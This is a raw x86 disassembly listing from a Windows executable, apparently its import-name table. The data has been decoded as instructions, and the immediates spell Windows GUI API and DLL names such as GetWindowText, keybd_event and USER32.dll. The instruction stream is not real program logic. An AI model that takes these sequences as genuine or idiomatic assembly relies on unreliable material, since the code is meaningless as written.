  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
